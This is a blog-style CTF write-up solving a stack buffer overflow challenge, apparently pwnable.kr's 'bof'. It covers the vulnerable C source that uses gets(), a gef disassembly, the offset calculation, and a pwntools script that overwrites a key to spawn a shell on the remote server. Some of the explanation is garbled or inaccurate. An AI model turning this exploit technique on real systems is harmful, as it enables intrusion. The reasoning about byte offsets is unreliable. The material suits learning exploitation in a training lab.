---
layout: post
published: true
title: Simple Stack overflow Challange 
tags:
 - ctf
 - stack overflow
 
comments: true

---

# Breakdown of program

I opened the challenge and found there two files bof and bof.c let’s breakdown the function :p so the program was:
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);	// smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

in this we can see there are two functions “func” and “main” in this program we can see function name “func” takes a parimiter key and declared a variable overflowme having a buffer 32 then it takes input and compares with the key “0xcafebabe” if the key is correct it gives us pass else it wll say nah while in the next function main () it just calling “func” and gives HARthe value of key “ox0deadbeef”
that’s how program worked what we need is to overwrite the stack to get the flag
binary eploitation and analysis
let’s dissamble the “func” function to see the asssembly code i.e whats hapening with our code

```
gef➤ disass func
Dump of assembler code for function func:
0x5655562c <+0>: push ebp
0x5655562d <+1>: mov ebp,esp
0x5655562f <+3>: sub esp,0x48
0x56555632 <+6>: mov eax,gs:0x14
0x56555638 <+12>: mov DWORD PTR [ebp-0xc],eax
0x5655563b <+15>: xor eax,eax
0x5655563d <+17>: mov DWORD PTR [esp],0x5655578c
0x56555644 <+24>: call 0xf7e27460 <__GI__IO_puts>
0x56555649 <+29>: lea eax,[ebp-0x2c]
0x5655564c <+32>: mov DWORD PTR [esp],eax
0x5655564f <+35>: call 0xf7e26980 <_IO_gets>
0x56555654 <+40>: cmp DWORD PTR [ebp+0x8],0xcafebabe
0x5655565b <+47>: jne 0x5655566b <func+63>
0x5655565d <+49>: mov DWORD PTR [esp],0x5655579b
[ Legend: Modified register | Code | Heap | Stack | String ]
here we can see cmp which compares both strings and gave us output according to our strings lest’s set breakpoint at cmp with his address and run the our program with AAAAAAAAAAAAAAAAAA to buffer overflow
gef➤ break *0x56555654
Breakpoint 2 at 0x56555654
gef➤ c
Continuing.
overflow me :
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

let’s start to search 0x0deadbeef key in esp register we can see it by typing x/40xw in gef debugger we can see output like this:

here we can see our output AAAAAAAAAAA as “0x414141” and we can see the key 0xedeadbeef too now we find out the distance between our input and the key i.e deadbeef we all know hexadecimal is of 16 bytes and value is stored IN REGISTERS like:
AAAA = 4*4 = 16
so as a highlighted our AAAA is started and where the 0x0deadbeef occurs there are 13 hexa digits so according to basic math
Distance = 13*4= 52 bytes
so we need 52 character to exploit so acccording to little endia ( data in c stored in format of little endia) key will be ‘\xbe\xba\xfe\xca’” and have 52 chracters so final payload will be
**python -c “print ‘A’ * 52 + ‘\xbe\xba\xfe\xca’”**
i code (steal) little python script and run this payload
from pwn import *
conn = remote(“pwnable.kr”, 9000)
payload = ‘A’ * 52 + ‘\xbe\xba\xfe\xca’
conn.sendline(payload)
conn.interactive()
then i got flag after going to home directory and typed cat flag :) that;s all
i made a video too if uh got time then saw this too: https://youtu.be/0s10ul66vqQ
